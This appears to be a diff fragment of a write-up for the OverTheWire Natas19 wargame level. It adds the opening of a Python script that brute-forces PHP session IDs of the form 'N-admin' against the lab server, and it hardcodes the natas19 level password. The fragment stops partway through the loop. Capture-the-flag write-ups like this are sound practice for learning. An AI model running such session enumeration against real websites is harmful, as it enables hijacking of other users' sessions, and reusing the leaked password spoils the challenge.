@@ -38,6 +38,22 @@ Based on the observation, also taking the hint into consideration, I guess Natas
 To break the password, I came up with the following python script:
 
 ```python
+#!/usr/bin/env python3
+
+import binascii
+import requests
+from requests.auth import HTTPBasicAuth
+
+
+s = requests.Session()
+s.auth = HTTPBasicAuth("natas19", "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs")
+url = 'http://natas19.natas.labs.overthewire.org/?debug'
+
+# resp = s.post(url, data={"username":'admin', "password":'abc'})
+# print(s.cookies.get_dict())
+# print(resp.headers)
+# print(resp.text)
+
 for i in range(1, 641):
     sid = f'{i}-admin'
     print(f'Trying PHPSESSID...{sid}', end="\r", flush=True)
